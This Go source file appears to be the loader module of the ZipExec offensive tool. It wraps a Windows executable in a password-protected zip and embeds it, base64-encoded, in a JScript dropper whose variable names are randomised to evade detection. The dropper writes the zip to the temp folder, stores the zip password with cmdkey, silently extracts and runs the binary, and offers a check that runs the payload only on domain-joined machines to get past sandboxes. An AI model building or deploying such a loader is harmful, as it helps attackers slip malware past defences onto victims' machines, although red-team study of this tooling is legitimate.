package Loader

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"text/template"

	"github.com/Tylous/ZipExec/Cryptor"

	"github.com/yeka/zip"
)

type JScriptLoader struct {
	Variables map[string]string
}

type SandboxJScript struct {
	Variables map[string]string
}

func Zipit(source, target string, password string) {
	base := filepath.Base(source)
	f, _ := os.Open(base)
	reader := bufio.NewReader(f)
	content, _ := ioutil.ReadAll(reader)
	contents := []byte(content)
	fzip, err := os.Create(target)
	if err != nil {
		log.Fatalln(err)
	}
	zipw := zip.NewWriter(fzip)
	defer zipw.Close()
	w, err := zipw.Encrypt(base, password, zip.StandardEncryption)
	if err != nil {
		log.Fatal(err)
	}
	_, err = io.Copy(w, bytes.NewReader(contents))
	if err != nil {
		log.Fatal(err)
	}
	zipw.Flush()
}

func JScriptLoader_Buff(name string, outFile string, sandbox bool) string {
	var buffer bytes.Buffer
	filename := name
	base := filepath.Base(name)
	sourcename := strings.Split(base, ".exe")
	name = sourcename[0]
	fmt.Println("[*] Creating Zip File Password")
	password := Cryptor.VarNumberLength(7, 10)
	fmt.Println("[+] Password is: " + password + "")
	zipfile := name + ".zip"
	fmt.Println("[*] Zipping Binary")
	Zipit(filename, zipfile, password)
	fmt.Println("[*] Encoding Binary")
	f, _ := os.Open(zipfile)
	reader := bufio.NewReader(f)
	content, _ := ioutil.ReadAll(reader)
	encoded := base64.StdEncoding.EncodeToString(content)

	SandboxJScript := &SandboxJScript{}
	SandboxJScript.Variables = make(map[string]string)
	JScriptLoader := &JScriptLoader{}
	JScriptLoader.Variables = make(map[string]string)

	JScriptLoader.Variables["fso"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["dropPath"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["value"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["strRegPath"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["WshShell"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["objShell"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["filename"] = name + ".zip"
	JScriptLoader.Variables["objFolder"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["FileExt"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["ssfPROGRAMS"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["w"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["WindowsUnZip"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["objFolderItems"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["objFolderItem"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["FileName"] = name
	JScriptLoader.Variables["dllext"] = ".zip"
	JScriptLoader.Variables["dll_code"] = encoded
	JScriptLoader.Variables["characters"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["base6411"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["rtest"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["atest"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["ctest"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["etest"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["htest"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["ttest"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["BinaryStream"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["filename1"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["dll"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["FileName"] = name
	JScriptLoader.Variables["binaryWriter"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["dropPath"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["res1"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["TextStream11"] = Cryptor.VarNumberLength(4, 12)

	JScriptLoader.Variables["pathworks"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["PATH"] = Cryptor.VarNumberLength(4, 12)
	JScriptLoader.Variables["password"] = password
	JScriptLoader.Variables["Shell"] = Cryptor.VarNumberLength(4, 12)

	buffer.Reset()
	fmt.Println("[*] Creating JScript Loader")
	JSLoaderTemplate, err := template.New("JScriptLoader").Parse(JSfile())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err = JSLoaderTemplate.Execute(&buffer, JScriptLoader); err != nil {
		log.Fatal(err)
	}
	if sandbox == true {
		fmt.Println("[*] Add Sandbox Controls (i.e. is the Endpoint Domain Joined)")
		SandboxJScript.Variables["objShell"] = Cryptor.VarNumberLength(4, 12)
		SandboxJScript.Variables["domain"] = Cryptor.VarNumberLength(4, 12)
		SandboxJScript.Variables["loader"] = buffer.String()
		buffer.Reset()
		SandboxJSTemplate, err := template.New("SandboxJScript").Parse(WScript_Sandbox())
		if err != nil {
			log.Fatal(err)
		}
		if err = SandboxJSTemplate.Execute(&buffer, SandboxJScript); err != nil {
			log.Fatal(err)
		}
	} else {

	}

	os.RemoveAll(zipfile)
	return buffer.String()
}

func JSfile() string {
	return `
	try {
	

	var {{.Variables.fso}} = new ActiveXObject("Scripting.FileSystemObject");
	var {{.Variables.dropPath}} = {{.Variables.fso}}.GetSpecialFolder(2);

    var {{.Variables.base6411}}={ {{.Variables.characters}}:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function({{.Variables.atest}}){ {{.Variables.base6411}}.{{.Variables.characters}};var {{.Variables.rtest}}="",{{.Variables.ctest}}=0;do{var {{.Variables.etest}}={{.Variables.atest}}.charCodeAt({{.Variables.ctest}}++),{{.Variables.ttest}}={{.Variables.atest}}.charCodeAt(c++),{{.Variables.htest}}=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,{{.Variables.rtest}}+={{.Variables.base6411}}.{{.Variables.characters}}.charAt(s)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(A)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(o)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(B)}while(c<a.length);return {{.Variables.rtest}}}};
    function Magic1({{.Variables.rtest}}){if(!/^[a-z0-9+/]+={0,2}$/i.test({{.Variables.rtest}})||{{.Variables.rtest}}.length%4!=0)throw Error("Not {{.Variables.base6411}} string");for(var t,e,n,o,i,a,f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",h=[],d=0;d<{{.Variables.rtest}}.length;d+=4)t=(a=f.indexOf({{.Variables.rtest}}.charAt(d))<<18|f.indexOf({{.Variables.rtest}}.charAt(d+1))<<12|(o=f.indexOf({{.Variables.rtest}}.charAt(d+2)))<<6|(i=f.indexOf({{.Variables.rtest}}.charAt(d+3))))>>>16&255,e=a>>>8&255,n=255&a,h[d/4]=String.fromCharCode(t,e,n),64==i&&(h[d/4]=String.fromCharCode(t,e)),64==o&&(h[d/4]=String.fromCharCode(t));return {{.Variables.rtest}}=h.join("")}
    function {{.Variables.binaryWriter}}({{.Variables.res1}},{{.Variables.filename1}})
    {var {{.Variables.base6411}}decoded=Magic1({{.Variables.res1}});var {{.Variables.TextStream11}}=new ActiveXObject('ADODB.Stream');{{.Variables.TextStream11}}.Type=2;{{.Variables.TextStream11}}.charSet='iso-8859-1';{{.Variables.TextStream11}}.Open();{{.Variables.TextStream11}}.WriteText({{.Variables.base6411}}decoded);var {{.Variables.BinaryStream}}=new ActiveXObject('ADODB.Stream');{{.Variables.BinaryStream}}.Type=1;{{.Variables.BinaryStream}}.Open();{{.Variables.TextStream11}}.Position=0;{{.Variables.TextStream11}}.CopyTo({{.Variables.BinaryStream}});{{.Variables.BinaryStream}}.SaveToFile({{.Variables.filename1}},2);{{.Variables.BinaryStream}}.Close()}

	var {{.Variables.dll}} = '{{.Variables.dll_code}}'
    
   
	{{.Variables.binaryWriter}}({{.Variables.dll}},{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}");
	function {{.Variables.WindowsUnZip}}()
	{	
		var {{.Variables.objShell}} = new ActiveXObject("shell.application");     
		var {{.Variables.WshShell}} = new ActiveXObject("WScript.Shell");
		var {{.Variables.objFolder}};
		var {{.Variables.FileExt}} = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt";
		var {{.Variables.ssfPROGRAMS}} = ""+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}.zip";
		{{.Variables.objFolder}} = {{.Variables.objShell}}.NameSpace({{.Variables.ssfPROGRAMS}});
		var {{.Variables.objFolderItems}};
		{{.Variables.objFolderItems}} = {{.Variables.objFolder}}.Items();  
		WScript.Sleep(5000);

		var {{.Variables.w}} = {{.Variables.WshShell}}.RegRead({{.Variables.FileExt}});
		if ({{.Variables.w}} < 1)  {
			{{.Variables.objFolderItem}} = {{.Variables.objFolderItems}}.Item({{.Variables.objFolderItems}}.Item(0).Name);
		}else {
			{{.Variables.objFolderItem}} = {{.Variables.objFolderItems}}.Item(({{.Variables.objFolderItems}}.Item(0).Name)+".exe");
		}
		{{.Variables.objFolderItem}}.Verbs().Item(0).DoIt()
	}
	var {{.Variables.pathworks}} = new ActiveXObject("Wscri"+"pt.shell");
	var {{.Variables.PATH}} = {{.Variables.pathworks}}.ExpandEnvironmentStrings("%TEMP%");

	var {{.Variables.Shell}} = new ActiveXObject("shell.application");
	{{.Variables.Shell}}.ShellExecute('cmdkey', '/generic:Microsoft_Windows_Shell_ZipFolder:filename='+{{.Variables.PATH}}+'\\{{.Variables.FileName}}.zip /pass:{{.Variables.password}} /user:""','','',0);      
	{{.Variables.WindowsUnZip}}();
	WScript.Sleep(5000);		
	{{.Variables.Shell}}.ShellExecute('cmdkey', '/delete Microsoft_Windows_Shell_ZipFolder:filename='+{{.Variables.PATH}}+'\\{{.Variables.FileName}}.zip','','',0);



}catch(e) {
}`
}

func WScript_Sandbox() string {
	return `
	var {{.Variables.objShell}} = new ActiveXObject("Shell.Application")
	var {{.Variables.domain}} =  {{.Variables.objShell}}.GetSystemInformation("IsOS_DomainMember");
	if ({{.Variables.domain}} == 0 ){
	}
	else {
		{{.Variables.loader}}
	}	
`
}
